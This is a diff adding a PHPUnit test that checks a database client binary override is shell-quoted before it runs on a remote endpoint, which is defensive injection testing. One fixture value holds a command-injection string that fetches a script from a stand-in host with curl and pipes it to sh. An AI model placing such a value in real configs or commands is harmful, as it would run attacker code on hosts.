@@ -85,4 +85,21 @@ final class ClientBinariesTest extends TestCase
         self::assertSame('mysql', $binaries->client);
         self::assertSame('mysqldump', $binaries->dump);
     }
+
+    /**
+     * The override is a binary path and lands in a command that runs on the
+     * endpoint, so it is one shell argument. It was the last config key that could
+     * still smuggle a command of its own onto a remote host.
+     */
+    #[Test]
+    public function anOverrideCarryingShellSyntaxIsQuoted(): void
+    {
+        $binaries = ClientBinaries::resolve(DatabaseSystem::MySQL, [
+            'mysql' => 'mysql; curl evil.example.com | sh',
+            'mysqldump' => '/opt/my dump/mysqldump',
+        ]);
+
+        self::assertSame("'mysql; curl evil.example.com | sh'", $binaries->client);
+        self::assertSame("'/opt/my dump/mysqldump'", $binaries->dump);
+    }
 }
